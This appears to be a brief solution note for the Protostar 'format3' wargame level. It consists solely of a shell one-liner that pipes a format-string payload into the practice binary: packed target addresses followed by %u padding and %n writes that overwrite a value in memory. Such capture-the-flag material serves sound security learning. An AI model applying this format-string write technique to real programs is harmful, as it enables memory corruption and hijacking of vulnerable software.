## protostar-format3

## http://exploit-exercises.com/protostar/format3

```

echo $(python -c 'print "\xf4\x96\x04\x08"')$(python -c 'print "\xf5\x96\x04\x08"')$(python -c 'print "\xf6\x96\x04\x08"')$(python -c 'print "\xf7\x96\x04\x08"')'%52u%12$n%''17u%13$n''%173u%14$n' | ./format3

```